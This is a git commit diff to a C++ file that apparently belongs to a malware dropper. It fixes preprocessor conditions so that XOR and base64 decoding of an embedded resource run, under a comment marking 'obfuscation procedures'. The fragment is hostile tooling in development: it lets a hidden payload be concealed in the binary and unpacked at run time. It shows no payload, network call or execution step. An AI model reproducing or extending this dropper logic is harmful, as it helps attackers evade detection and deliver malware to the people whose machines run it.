d52e23c4f883ed0a6762daaedba06f3270387490
Adi <adindeshpande@gmail.com>
2026-06-19 21:05:47 -0500

    Fixed the equals macros for encoding in the cpp file

--- Linux_mint_22.3/FileSystem_exe_rebuild/FileSystem_exe_rebuild.cpp
+++ Linux_mint_22.3/FileSystem_exe_rebuild/FileSystem_exe_rebuild.cpp
@@ -76,12 +76,12 @@ int main(int argc, char* argv[])
 	DWORD size = SizeofResource(h, r);
 	// Obfuscation Procedures start here
 
-	#if DROPPER_XOR_KEY == 0
+	#if DROPPER_XOR_KEY != 0
 		std::cout << "Xor has been run!\n";
 		data = XOR(data, size);
 	#endif
 
-	#if DROPPER_BASE64 == 0
+	#if DROPPER_BASE64 == 1
 		std::cout << "Base64 has been run!\n";
 		data = base64decode(data, &size);
 	#endif
